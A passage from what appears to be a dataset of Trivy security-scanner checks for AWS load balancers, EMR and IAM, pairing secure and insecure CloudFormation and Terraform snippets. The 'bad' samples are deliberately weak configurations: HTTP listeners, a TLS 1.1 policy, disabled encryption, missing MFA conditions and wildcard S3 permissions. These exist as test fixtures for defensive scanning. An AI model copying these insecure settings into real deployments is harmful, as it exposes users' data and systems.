        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-elasticloadbalancingv2-loadbalancer.html\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n          Properties:\n            LoadBalancerAttributes:\n              - Key: routing.http.drop_invalid_header_fields.enabled\n                Value: true\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n          Properties:\n            Type: gateway\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n          Properties:\n            LoadBalancerAttributes:\n              - Key: routing.http.drop_invalid_header_fields.enabled\n                Value: false\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lb#drop_invalid_header_fields\n  good:\n    - |-\n      resource \"aws_alb\" \"good_example\" {\n        drop_invalid_header_fields = true\n      }\n  bad:\n    - |-\n      resource \"aws_alb\" \"bad_example\" {\n        drop_invalid_header_fields = false\n      }\n",
        "file_name": "drop_invalid_headers.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/elb/drop_invalid_headers.yaml",
        "local_path": "aws/elb/drop_invalid_headers.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-elasticloadbalancingv2-loadbalancer.html"
            ],
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n    Properties:\n      LoadBalancerAttributes:\n        - Key: routing.http.drop_invalid_header_fields.enabled\n          Value: true",
              "Resources:\n  GoodExample:\n    Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n    Properties:\n      Type: gateway"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n    Properties:\n      LoadBalancerAttributes:\n        - Key: routing.http.drop_invalid_header_fields.enabled\n          Value: false"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lb#drop_invalid_header_fields"
            ],
            "good": [
              "resource \"aws_alb\" \"good_example\" {\n  drop_invalid_header_fields = true\n}"
            ],
            "bad": [
              "resource \"aws_alb\" \"bad_example\" {\n  drop_invalid_header_fields = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ELB-HTTP_NOT_USED",
        "title": "Http Not Used",
        "provider": "aws",
        "service": "elb",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-elasticloadbalancingv2-listener.html\n  good:\n    - |-\n      Resources:\n        myLoadBalancer:\n          Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n\n        GoodExample:\n          Type: AWS::ElasticLoadBalancingV2::Listener\n          Properties:\n            LoadBalancerArn: !Ref myLoadBalancer\n            Protocol: HTTPS\n  bad:\n    - |-\n      Resources:\n        myLoadBalancer:\n          Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n\n        BadExample:\n          Type: AWS::ElasticLoadBalancingV2::Listener\n          Properties:\n            LoadBalancerArn: !Ref myLoadBalancer\n            Protocol: HTTP\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lb_listener\n  good:\n    - |-\n      resource \"aws_lb\" \"example\" {}\n\n      resource \"aws_alb_listener\" \"good_example\" {\n        load_balancer_arn = aws_lb.example.arn\n        protocol          = \"HTTPS\"\n      }\n  bad:\n    - |-\n      resource \"aws_lb\" \"example\" {}\n\n      resource \"aws_alb_listener\" \"bad_example\" {\n        load_balancer_arn = aws_lb.example.arn\n        protocol          = \"HTTP\"\n      }\n",
        "file_name": "http_not_used.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/elb/http_not_used.yaml",
        "local_path": "aws/elb/http_not_used.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-elasticloadbalancingv2-listener.html"
            ],
            "good": [
              "Resources:\n  myLoadBalancer:\n    Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n\n  GoodExample:\n    Type: AWS::ElasticLoadBalancingV2::Listener\n    Properties:\n      LoadBalancerArn: !Ref myLoadBalancer\n      Protocol: HTTPS"
            ],
            "bad": [
              "Resources:\n  myLoadBalancer:\n    Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n\n  BadExample:\n    Type: AWS::ElasticLoadBalancingV2::Listener\n    Properties:\n      LoadBalancerArn: !Ref myLoadBalancer\n      Protocol: HTTP"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lb_listener"
            ],
            "good": [
              "resource \"aws_lb\" \"example\" {}\n\nresource \"aws_alb_listener\" \"good_example\" {\n  load_balancer_arn = aws_lb.example.arn\n  protocol          = \"HTTPS\"\n}"
            ],
            "bad": [
              "resource \"aws_lb\" \"example\" {}\n\nresource \"aws_alb_listener\" \"bad_example\" {\n  load_balancer_arn = aws_lb.example.arn\n  protocol          = \"HTTP\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ELB-USE_SECURE_TLS_POLICY",
        "title": "Use Secure Tls Policy",
        "provider": "aws",
        "service": "elb",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-elasticloadbalancingv2-listener.html\n  good:\n    - |-\n      Resources:\n        myLoadBalancer:\n          Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n\n        GoodExample:\n          Type: AWS::ElasticLoadBalancingV2::Listener\n          Properties:\n            LoadBalancerArn: !Ref myLoadBalancer\n            Protocol: HTTPS\n            SslPolicy: ELBSecurityPolicy-TLS13-1-2-2021-06\n  bad:\n    - |-\n      Resources:\n        myLoadBalancer:\n          Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n\n        BadExample:\n          Type: AWS::ElasticLoadBalancingV2::Listener\n          Properties:\n            LoadBalancerArn: !Ref myLoadBalancer\n            Protocol: HTTPS\n            SslPolicy: ELBSecurityPolicy-TLS-1-1-2017-01\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lb_listener\n  good:\n    - |-\n      resource \"aws_lb\" \"example\" {}\n\n      resource \"aws_alb_listener\" \"good_example\" {\n        load_balancer_arn = aws_lb.example.arn\n        ssl_policy        = \"ELBSecurityPolicy-TLS13-1-2-2021-06\"\n        protocol          = \"HTTPS\"\n      }\n  bad:\n    - |-\n      resource \"aws_lb\" \"example\" {}\n\n      resource \"aws_alb_listener\" \"bad_example\" {\n        load_balancer_arn = aws_lb.example.arn\n        ssl_policy        = \"ELBSecurityPolicy-TLS-1-1-2017-01\"\n        protocol          = \"HTTPS\"\n      }\n",
        "file_name": "use_secure_tls_policy.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/elb/use_secure_tls_policy.yaml",
        "local_path": "aws/elb/use_secure_tls_policy.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-elasticloadbalancingv2-listener.html"
            ],
            "good": [
              "Resources:\n  myLoadBalancer:\n    Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n\n  GoodExample:\n    Type: AWS::ElasticLoadBalancingV2::Listener\n    Properties:\n      LoadBalancerArn: !Ref myLoadBalancer\n      Protocol: HTTPS\n      SslPolicy: ELBSecurityPolicy-TLS13-1-2-2021-06"
            ],
            "bad": [
              "Resources:\n  myLoadBalancer:\n    Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n\n  BadExample:\n    Type: AWS::ElasticLoadBalancingV2::Listener\n    Properties:\n      LoadBalancerArn: !Ref myLoadBalancer\n      Protocol: HTTPS\n      SslPolicy: ELBSecurityPolicy-TLS-1-1-2017-01"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lb_listener"
            ],
            "good": [
              "resource \"aws_lb\" \"example\" {}\n\nresource \"aws_alb_listener\" \"good_example\" {\n  load_balancer_arn = aws_lb.example.arn\n  ssl_policy        = \"ELBSecurityPolicy-TLS13-1-2-2021-06\"\n  protocol          = \"HTTPS\"\n}"
            ],
            "bad": [
              "resource \"aws_lb\" \"example\" {}\n\nresource \"aws_alb_listener\" \"bad_example\" {\n  load_balancer_arn = aws_lb.example.arn\n  ssl_policy        = \"ELBSecurityPolicy-TLS-1-1-2017-01\"\n  protocol          = \"HTTPS\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EMR-ENABLE_AT_REST_ENCRYPTION",
        "title": "Enable At Rest Encryption",
        "provider": "aws",
        "service": "emr",
        "language": "cloudformation",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/emr_security_configuration\n  good:\n    - |-\n      resource \"aws_emr_security_configuration\" \"good_example\" {\n        name = \"emrsc_other\"\n\n        configuration = <<EOF\n        {\n          \"EncryptionConfiguration\": {\n            \"AtRestEncryptionConfiguration\": {\n              \"S3EncryptionConfiguration\": {\n                \"EncryptionMode\": \"SSE-S3\"\n              },\n              \"LocalDiskEncryptionConfiguration\": {\n                \"EncryptionKeyProviderType\": \"AwsKms\",\n                \"AwsKmsKey\": \"arn:aws:kms:us-west-2:187416307283:alias/tf_emr_test_key\"\n              }\n            },\n            \"EnableInTransitEncryption\": true,\n            \"EnableAtRestEncryption\": true\n          }\n        }\n        EOF\n      }\n  bad:\n    - |-\n      resource \"aws_emr_security_configuration\" \"bad_example\" {\n        name = \"emrsc_other\"\n\n        configuration = <<EOF\n        {\n          \"EncryptionConfiguration\": {\n            \"AtRestEncryptionConfiguration\": {\n              \"S3EncryptionConfiguration\": {\n                \"EncryptionMode\": \"SSE-S3\"\n              },\n              \"LocalDiskEncryptionConfiguration\": {\n                \"EncryptionKeyProviderType\": \"AwsKms\",\n                \"AwsKmsKey\": \"arn:aws:kms:us-west-2:187416307283:alias/tf_emr_test_key\"\n              }\n            },\n            \"EnableInTransitEncryption\": false,\n            \"EnableAtRestEncryption\": false\n          }\n        }\n        EOF\n      }\n",
        "file_name": "enable_at_rest_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/emr/enable_at_rest_encryption.yaml",
        "local_path": "aws/emr/enable_at_rest_encryption.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/emr_security_configuration"
            ],
            "good": [
              "resource \"aws_emr_security_configuration\" \"good_example\" {\n  name = \"emrsc_other\"\n\n  configuration = <<EOF\n  {\n    \"EncryptionConfiguration\": {\n      \"AtRestEncryptionConfiguration\": {\n        \"S3EncryptionConfiguration\": {\n          \"EncryptionMode\": \"SSE-S3\"\n        },\n        \"LocalDiskEncryptionConfiguration\": {\n          \"EncryptionKeyProviderType\": \"AwsKms\",\n          \"AwsKmsKey\": \"arn:aws:kms:us-west-2:187416307283:alias/tf_emr_test_key\"\n        }\n      },\n      \"EnableInTransitEncryption\": true,\n      \"EnableAtRestEncryption\": true\n    }\n  }\n  EOF\n}"
            ],
            "bad": [
              "resource \"aws_emr_security_configuration\" \"bad_example\" {\n  name = \"emrsc_other\"\n\n  configuration = <<EOF\n  {\n    \"EncryptionConfiguration\": {\n      \"AtRestEncryptionConfiguration\": {\n        \"S3EncryptionConfiguration\": {\n          \"EncryptionMode\": \"SSE-S3\"\n        },\n        \"LocalDiskEncryptionConfiguration\": {\n          \"EncryptionKeyProviderType\": \"AwsKms\",\n          \"AwsKmsKey\": \"arn:aws:kms:us-west-2:187416307283:alias/tf_emr_test_key\"\n        }\n      },\n      \"EnableInTransitEncryption\": false,\n      \"EnableAtRestEncryption\": false\n    }\n  }\n  EOF\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EMR-ENABLE_IN_TRANSIT_ENCRYPTION",
        "title": "Enable In Transit Encryption",
        "provider": "aws",
        "service": "emr",
        "language": "cloudformation",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/emr_security_configuration\n  good:\n    - |-\n      resource \"aws_emr_security_configuration\" \"good_example\" {\n        name = \"emrsc_other\"\n\n        configuration = <<EOF\n        {\n          \"EncryptionConfiguration\": {\n            \"AtRestEncryptionConfiguration\": {\n              \"S3EncryptionConfiguration\": {\n                \"EncryptionMode\": \"SSE-S3\"\n              },\n              \"LocalDiskEncryptionConfiguration\": {\n                \"EncryptionKeyProviderType\": \"AwsKms\",\n                \"AwsKmsKey\": \"arn:aws:kms:us-west-2:187416307283:alias/tf_emr_test_key\"\n              }\n            },\n            \"EnableInTransitEncryption\": true,\n            \"EnableAtRestEncryption\": true\n          }\n        }\n        EOF\n      }\n  bad:\n    - |-\n      resource \"aws_emr_security_configuration\" \"bad_example\" {\n        name = \"emrsc_other\"\n\n        configuration = <<EOF\n        {\n          \"EncryptionConfiguration\": {\n            \"AtRestEncryptionConfiguration\": {\n              \"S3EncryptionConfiguration\": {\n                \"EncryptionMode\": \"SSE-S3\"\n              },\n              \"LocalDiskEncryptionConfiguration\": {\n                \"EncryptionKeyProviderType\": \"AwsKms\",\n                \"AwsKmsKey\": \"arn:aws:kms:us-west-2:187416307283:alias/tf_emr_test_key\"\n              }\n            },\n            \"EnableInTransitEncryption\": false,\n            \"EnableAtRestEncryption\": false\n          }\n        }\n        EOF\n      }\n",
        "file_name": "enable_in_transit_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/emr/enable_in_transit_encryption.yaml",
        "local_path": "aws/emr/enable_in_transit_encryption.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/emr_security_configuration"
            ],
            "good": [
              "resource \"aws_emr_security_configuration\" \"good_example\" {\n  name = \"emrsc_other\"\n\n  configuration = <<EOF\n  {\n    \"EncryptionConfiguration\": {\n      \"AtRestEncryptionConfiguration\": {\n        \"S3EncryptionConfiguration\": {\n          \"EncryptionMode\": \"SSE-S3\"\n        },\n        \"LocalDiskEncryptionConfiguration\": {\n          \"EncryptionKeyProviderType\": \"AwsKms\",\n          \"AwsKmsKey\": \"arn:aws:kms:us-west-2:187416307283:alias/tf_emr_test_key\"\n        }\n      },\n      \"EnableInTransitEncryption\": true,\n      \"EnableAtRestEncryption\": true\n    }\n  }\n  EOF\n}"
            ],
            "bad": [
              "resource \"aws_emr_security_configuration\" \"bad_example\" {\n  name = \"emrsc_other\"\n\n  configuration = <<EOF\n  {\n    \"EncryptionConfiguration\": {\n      \"AtRestEncryptionConfiguration\": {\n        \"S3EncryptionConfiguration\": {\n          \"EncryptionMode\": \"SSE-S3\"\n        },\n        \"LocalDiskEncryptionConfiguration\": {\n          \"EncryptionKeyProviderType\": \"AwsKms\",\n          \"AwsKmsKey\": \"arn:aws:kms:us-west-2:187416307283:alias/tf_emr_test_key\"\n        }\n      },\n      \"EnableInTransitEncryption\": false,\n      \"EnableAtRestEncryption\": false\n    }\n  }\n  EOF\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EMR-ENABLE_LOCAL_DISK_ENCRYPTION",
        "title": "Enable Local Disk Encryption",
        "provider": "aws",
        "service": "emr",
        "language": "cloudformation",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/emr_security_configuration\n  good:\n    - |-\n      resource \"aws_emr_security_configuration\" \"good_example\" {\n        name = \"emrsc_other\"\n\n        configuration = <<EOF\n        {\n          \"EncryptionConfiguration\": {\n            \"AtRestEncryptionConfiguration\": {\n              \"S3EncryptionConfiguration\": {\n                \"EncryptionMode\": \"SSE-S3\"\n              },\n              \"LocalDiskEncryptionConfiguration\": {\n                \"EncryptionKeyProviderType\": \"AwsKms\",\n                \"AwsKmsKey\": \"arn:aws:kms:us-west-2:187416307283:alias/tf_emr_test_key\"\n              }\n            },\n            \"EnableInTransitEncryption\": true,\n            \"EnableAtRestEncryption\": true\n          }\n        }\n        EOF\n      }\n  bad:\n    - |-\n      resource \"aws_emr_security_configuration\" \"bad_example\" {\n        name = \"emrsc_other\"\n\n        configuration = <<EOF\n        {\n          \"EncryptionConfiguration\": {\n            \"AtRestEncryptionConfiguration\": {\n              \"S3EncryptionConfiguration\": {\n                \"EncryptionMode\": \"SSE-S3\"\n              },\n              \"LocalDiskEncryptionConfiguration\": {\n                \"EncryptionKeyProviderType\": \"\",\n                \"AwsKmsKey\": \"\"\n              }\n            },\n            \"EnableInTransitEncryption\": false,\n            \"EnableAtRestEncryption\": false\n          }\n        }\n        EOF\n      }\n",
        "file_name": "enable_local_disk_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/emr/enable_local_disk_encryption.yaml",
        "local_path": "aws/emr/enable_local_disk_encryption.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/emr_security_configuration"
            ],
            "good": [
              "resource \"aws_emr_security_configuration\" \"good_example\" {\n  name = \"emrsc_other\"\n\n  configuration = <<EOF\n  {\n    \"EncryptionConfiguration\": {\n      \"AtRestEncryptionConfiguration\": {\n        \"S3EncryptionConfiguration\": {\n          \"EncryptionMode\": \"SSE-S3\"\n        },\n        \"LocalDiskEncryptionConfiguration\": {\n          \"EncryptionKeyProviderType\": \"AwsKms\",\n          \"AwsKmsKey\": \"arn:aws:kms:us-west-2:187416307283:alias/tf_emr_test_key\"\n        }\n      },\n      \"EnableInTransitEncryption\": true,\n      \"EnableAtRestEncryption\": true\n    }\n  }\n  EOF\n}"
            ],
            "bad": [
              "resource \"aws_emr_security_configuration\" \"bad_example\" {\n  name = \"emrsc_other\"\n\n  configuration = <<EOF\n  {\n    \"EncryptionConfiguration\": {\n      \"AtRestEncryptionConfiguration\": {\n        \"S3EncryptionConfiguration\": {\n          \"EncryptionMode\": \"SSE-S3\"\n        },\n        \"LocalDiskEncryptionConfiguration\": {\n          \"EncryptionKeyProviderType\": \"\",\n          \"AwsKmsKey\": \"\"\n        }\n      },\n      \"EnableInTransitEncryption\": false,\n      \"EnableAtRestEncryption\": false\n    }\n  }\n  EOF\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-IAM-ENFORCE_GROUP_MFA",
        "title": "Enforce Group Mfa",
        "provider": "aws",
        "service": "iam",
        "language": "cloudformation",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/modules/terraform-module/enforce-mfa/aws/latest\n    - https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details\n  good:\n    - |-\n      resource \"aws_iam_group\" \"support\" {\n        name = \"support\"\n      }\n      resource \"aws_iam_group_policy\" \"mfa\" {\n\n        group  = aws_iam_group.support.name\n        policy = <<EOF\n      {\n        \"Version\": \"2012-10-17\",\n        \"Statement\": [\n          {\n            \"Sid\": \"\",\n            \"Effect\": \"Allow\",\n            \"Action\": \"ec2:*\",\n            \"Resource\": \"*\",\n            \"Condition\": {\n                \"Bool\": {\n                    \"aws:MultiFactorAuthPresent\": [\"true\"]\n                }\n            }\n          }\n        ]\n      }\n      EOF\n      }\n    - |-\n      resource \"aws_iam_group\" \"support\" {\n        name = \"support\"\n      }\n      resource \"aws_iam_policy\" \"mfa\" {\n\n        name   = \"something\"\n        policy = <<EOF\n      {\n        \"Version\": \"2012-10-17\",\n        \"Statement\": [\n          {\n            \"Sid\": \"\",\n            \"Effect\": \"Allow\",\n            \"Action\": \"ec2:*\",\n            \"Resource\": \"*\",\n            \"Condition\": {\n                \"Bool\": {\n                    \"aws:MultiFactorAuthPresent\": [\"true\"]\n                }\n            }\n          }\n        ]\n      }\n      EOF\n      }\n      resource \"aws_iam_group_policy_attachment\" \"attach\" {\n        group      = aws_iam_group.support.name\n        policy_arn = aws_iam_policy.mfa.id\n      }\n    - |-\n      resource \"aws_iam_group\" \"support\" {\n        name = \"support\"\n      }\n      resource \"aws_iam_group_policy\" \"mfa\" {\n        group  = aws_iam_group.support.name\n        policy = data.aws_iam_policy_document.combined.json\n      }\n      data \"aws_iam_policy_document\" \"policy_override\" {\n        statement {\n          sid       = \"main\"\n          effect    = \"Allow\"\n          actions   = [\"s3:*\"]\n          resources = [\"*\"]\n          condition {\n            test     = \"Bool\"\n            variable = \"aws:MultiFactorAuthPresent\"\n            values   = [\"true\"]\n          }\n        }\n      }\n      data \"aws_iam_policy_document\" \"policy_source\" {\n        statement {\n          sid       = \"main\"\n          effect    = \"Allow\"\n          actions   = [\"iam:*\"]\n          resources = [\"*\"]\n        }\n      }\n      data \"aws_iam_policy_document\" \"policy_misc\" {\n        statement {\n          sid       = \"misc\"\n          effect    = \"Deny\"\n          actions   = [\"logs:*\"]\n          resources = [\"*\"]\n        }\n      }\n      data \"aws_iam_policy_document\" \"combined\" {\n        source_json = <<EOF\n          {\n              \"Id\": \"base\"\n          }\n      EOF\n        source_policy_documents = [\n          data.aws_iam_policy_document.policy_source.json\n        ]\n        override_policy_documents = [\n          data.aws_iam_policy_document.policy_override.json,\n          data.aws_iam_policy_document.policy_misc.json\n        ]\n        statement {\n          sid       = \"whatever\"\n          effect    = \"Deny\"\n          actions   = [\"*\"]\n          resources = [\"*\"]\n        }\n      }\n  bad:\n    - |-\n      data \"aws_caller_identity\" \"current\" {}\n      resource \"aws_iam_group\" \"developers\" {\n        name = \"developers\"\n      }\n",
        "file_name": "enforce_group_mfa.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/iam/enforce_group_mfa.yaml",
        "local_path": "aws/iam/enforce_group_mfa.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/modules/terraform-module/enforce-mfa/aws/latest",
              "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details"
            ],
            "good": [
              "resource \"aws_iam_group\" \"support\" {\n  name = \"support\"\n}\nresource \"aws_iam_group_policy\" \"mfa\" {\n\n  group  = aws_iam_group.support.name\n  policy = <<EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"\",\n      \"Effect\": \"Allow\",\n      \"Action\": \"ec2:*\",\n      \"Resource\": \"*\",\n      \"Condition\": {\n          \"Bool\": {\n              \"aws:MultiFactorAuthPresent\": [\"true\"]\n          }\n      }\n    }\n  ]\n}\nEOF\n}",
              "resource \"aws_iam_group\" \"support\" {\n  name = \"support\"\n}\nresource \"aws_iam_policy\" \"mfa\" {\n\n  name   = \"something\"\n  policy = <<EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"\",\n      \"Effect\": \"Allow\",\n      \"Action\": \"ec2:*\",\n      \"Resource\": \"*\",\n      \"Condition\": {\n          \"Bool\": {\n              \"aws:MultiFactorAuthPresent\": [\"true\"]\n          }\n      }\n    }\n  ]\n}\nEOF\n}\nresource \"aws_iam_group_policy_attachment\" \"attach\" {\n  group      = aws_iam_group.support.name\n  policy_arn = aws_iam_policy.mfa.id\n}",
              "resource \"aws_iam_group\" \"support\" {\n  name = \"support\"\n}\nresource \"aws_iam_group_policy\" \"mfa\" {\n  group  = aws_iam_group.support.name\n  policy = data.aws_iam_policy_document.combined.json\n}\ndata \"aws_iam_policy_document\" \"policy_override\" {\n  statement {\n    sid       = \"main\"\n    effect    = \"Allow\"\n    actions   = [\"s3:*\"]\n    resources = [\"*\"]\n    condition {\n      test     = \"Bool\"\n      variable = \"aws:MultiFactorAuthPresent\"\n      values   = [\"true\"]\n    }\n  }\n}\ndata \"aws_iam_policy_document\" \"policy_source\" {\n  statement {\n    sid       = \"main\"\n    effect    = \"Allow\"\n    actions   = [\"iam:*\"]\n    resources = [\"*\"]\n  }\n}\ndata \"aws_iam_policy_document\" \"policy_misc\" {\n  statement {\n    sid       = \"misc\"\n    effect    = \"Deny\"\n    actions   = [\"logs:*\"]\n    resources = [\"*\"]\n  }\n}\ndata \"aws_iam_policy_document\" \"combined\" {\n  source_json = <<EOF\n    {\n        \"Id\": \"base\"\n    }\nEOF\n  source_policy_documents = [\n    data.aws_iam_policy_document.policy_source.json\n  ]\n  override_policy_documents = [\n    data.aws_iam_policy_document.policy_override.json,\n    data.aws_iam_policy_document.policy_misc.json\n  ]\n  statement {\n    sid       = \"whatever\"\n    effect    = \"Deny\"\n    actions   = [\"*\"]\n    resources = [\"*\"]\n  }\n}"
            ],
            "bad": [
              "data \"aws_caller_identity\" \"current\" {}\nresource \"aws_iam_group\" \"developers\" {\n  name = \"developers\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-IAM-LIMIT_S3_FULL_ACCESS",
        "title": "Limit S3 Full Access",
        "provider": "aws",
        "service": "iam",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Resources:\n        GoodPolicy:\n          Type: AWS::IAM::Policy\n          Properties:\n            PolicyName: good_policy\n            PolicyDocument:\n              Version: \"2012-10-17\"\n              Statement:\n                - Effect: Allow\n                  Action:\n                    - s3:GetObject\n                    - s3:PutObject\n                  Resource: arn:aws:s3:::examplebucket/*\n            Roles:\n              - !Ref GoodRole\n\n        GoodRole:\n          Type: AWS::IAM::Role\n          Properties:\n            RoleName: good_role\n            AssumeRolePolicyDocument:\n              Version: \"2012-10-17\"\n              Statement:\n                - Effect: Allow\n                  Principal:\n                    Service: ec2.amazonaws.com\n                  Action: sts:AssumeRole\n  bad:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Resources:\n        BadPolicy:\n          Type: AWS::IAM::Policy\n          Properties:\n            PolicyName: bad_policy\n            PolicyDocument:\n              Version: \"2012-10-17\"\n              Statement:\n                - Effect: Allow\n                  Action: s3:*\n                  Resource: '*'\n            Roles:\n              - !Ref BadRole\n\n        BadRole:\n          Type: AWS::IAM::Role\n          Properties:\n            RoleName: bad_role\n            AssumeRolePolicyDocument:\n              Version: \"2012-10-17\"\n              Statement:\n                - Effect: Allow\n                  Principal:\n                    Service: ec2.amazonaws.com\n                  Action: sts:AssumeRole\nterraform:\n  good:\n    - |-\n      resource \"aws_iam_policy\" \"good_policy\" {\n        name = \"good_policy\"\n        policy = jsonencode({\n          Version = \"2012-10-17\"\n          Statement = [\n            {\n              Effect = \"Allow\"\n              Action = [\n                \"s3:GetObject\",\n                \"s3:PutObject\"\n              ]\n              Resource = \"arn:aws:s3:::examplebucket/*\"\n            }\n          ]\n        })\n      }\n\n      resource \"aws_iam_role\" \"good_role\" {\n        name = \"good_role\"\n        assume_role_policy = jsonencode({\n          Version = \"2012-10-17\"\n          Statement = [\n            {\n              Effect = \"Allow\"\n              Principal = {\n                Service = \"ec2.amazonaws.com\"\n              }\n              Action = \"sts:AssumeRole\"\n            }\n          ]\n        })\n      }\n\n      resource \"aws_iam_role_policy_attachment\" \"good_role_policy_attachment\" {\n        role       = aws_iam_role.good_role.name\n        policy_arn = aws_iam_policy.good_policy.arn\n      }\n  bad:\n    - |-\n      resource \"aws_iam_policy\" \"bad_policy\" {\n        name = \"bad_policy\"\n        policy = jsonencode({\n          Version = \"2012-10-17\"\n          Statement = [\n            {\n              Effect   = \"Allow\"\n              Action   = \"s3:*\"\n              Resource = \"*\"\n            }\n          ]\n        })\n      }\n\n      resource \"aws_iam_role_policy_attachment\" \"test\" {\n        role       = aws_iam_role.test.name\n        policy_arn = \"arn:aws:iam::aws:policy/AmazonS3FullAccess\"\n      }\n\n      resource \"aws_iam_role\" \"bad_role\" {\n        name = \"bad_role\"\n        assume_role_policy = jsonencode({\n          Version = \"2012-10-17\"\n          Statement = [\n            {\n              Effect = \"Allow\"\n              Principal = {\n                Service = \"ec2.amazonaws.com\"\n              }\n              Action = \"sts:AssumeRole\"\n            }\n          ]\n        })\n      }\n\n      resource \"aws_iam_role_policy_attachment\" \"bad_role_policy_attachment\" {\n        role       = aws_iam_role.bad_role.name\n        policy_arn = aws_iam_policy.bad_policy.arn\n      }\n",
        "file_name": "limit_s3_full_access.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/iam/limit_s3_full_access.yaml",
        "local_path": "aws/iam/limit_s3_full_access.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nResources:\n  GoodPolicy:\n    Type: AWS::IAM::Policy\n    Properties:\n      PolicyName: good_policy\n      PolicyDocument:\n        Version: \"2012-10-17\"\n        Statement:\n          - Effect: Allow\n            Action:\n              - s3:GetObject\n              - s3:PutObject\n            Resource: arn:aws:s3:::examplebucket/*\n      Roles:\n        - !Ref GoodRole\n\n  GoodRole:\n    Type: AWS::IAM::Role\n    Properties:\n      RoleName: good_role\n      AssumeRolePolicyDocument:\n        Version: \"2012-10-17\"\n        Statement:\n          - Effect: Allow\n            Principal:\n              Service: ec2.amazonaws.com\n            Action: sts:AssumeRole"
            ],
            "bad": [
